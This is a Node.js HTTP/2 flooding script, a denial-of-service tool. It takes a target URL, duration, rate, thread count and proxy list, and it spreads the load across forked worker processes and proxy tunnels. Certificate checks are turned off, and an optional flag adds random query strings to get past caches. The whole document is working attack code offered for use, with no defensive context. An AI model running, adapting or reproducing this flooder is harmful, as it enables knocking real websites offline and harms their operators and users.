const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});
if (process.argv.length < 7) {
  console.log(`node unknown.js [target] [time] [rate] [thread] [proxy]`);
  console.log(`optional: --path ( for cache bypass )`);
  process.exit();
}
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}
function randomIntn(min, max) {
  return min + ((Math.random() * (max - min + 1)) | 0);
}

function randomElement(arr) {
  return arr[(Math.random() * arr.length) | 0];
}
function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}
const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    pathFlag: process.argv.includes('--path'),
};
var proxies = readLines(args.proxyFile);
const parsedTarget = new URL(args.target);
if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 0);
}
class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}
const Socker = new NetSocket();
function buildHeaders() {
    let rand_path;
    if (args.pathFlag) {
        const rand_query = `?${randomString(12)}=${randomIntn(100000, 999999)}`;
        rand_path = (parsedTarget.pathname || "/") + rand_query;
    } else {
        rand_path = parsedTarget.pathname || "/";
    }
    const headers = {
        ":method": "GET",
        ":scheme": "https",
        ":path": rand_path,
        ":authority": parsedTarget.host
    };
    return headers;
}
function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100,
    };
    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return
        connection.setKeepAlive(true, 600000);
        const tlsOptions = {
            ALPNProtocols: ['h2', 'http/1.1'],
            rejectUnauthorized: false,
            socket: connection,
            servername: parsedTarget.host,
            ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305",
            sigalgs: "ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha256:rsa_pkcs1_sha384:rsa_pkcs1_sha512",
            ecdhCurve: 'X25519:prime256v1:secp384r1:secp521r1',
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3"
        };
        const tlsConn = tls.connect(tlsOptions);
        tlsConn.setKeepAlive(true, 60000);
        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 4096,
                maxConcurrentStreams: 100,
                initialWindowSize: 2097152,
                maxFrameSize: 16384,
            },
            createConnection: () => tlsConn
        });
        client.on("connect", () => {
            setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(buildHeaders());
                    request.close();
                }
            }, 1000);
        });
        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });
    });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);
